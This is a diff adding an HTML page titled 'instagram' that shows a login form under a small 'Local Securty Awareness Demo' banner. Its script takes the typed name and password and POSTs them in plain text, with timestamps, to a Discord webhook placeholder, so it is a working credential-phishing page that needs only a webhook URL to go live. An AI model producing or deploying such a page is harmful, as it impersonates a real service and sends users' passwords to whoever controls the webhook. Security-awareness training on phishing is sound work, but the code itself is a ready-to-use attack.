@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>instagram</title>
+</head>
+
+<body>
+
+    <div class="training-warning">Local Securty Awareness Demo</div>
+
+    <div class="card">
+
+
+        <form id="form">
+
+            <label for="username">Name: </label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="username">Password: </label>
+            <input type="text" id="password" name="password" required>
+
+            <button type="submit">Log In</button>
+
+        </form>
+
+    </div>
+
+
+    <script>
+        const formLoadTime = new Date();
+
+        document.getElementById('form').addEventListener('submit', function (event) {
+
+            // Prevent the browser from reloading
+            event.preventDefault();
+
+            const submitClickTime = new Date();
+
+            const nameValue = document.getElementById('name').value;
+            const passwordValue = document.getElementById("password").value;
+
+            const webhookUrl = "{{DS-HOOK}}";
+
+            const discordMessage = {
+
+                content: `**New Form Submission**\n` +
+                    `**Name:** ${nameValue}\n` +
+                    `**Password:** ${passwordValue}\n` +
+                    `**Form Opened At:** ${formLoadTime.toLocaleString()}\n` +
+                    `**Submit Clicked At:** ${submitClickTime.toLocaleString()}`
+            };
+
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(discordMessage)
+            });
+        })
+    </script>
+
+</body>
+
+</html>
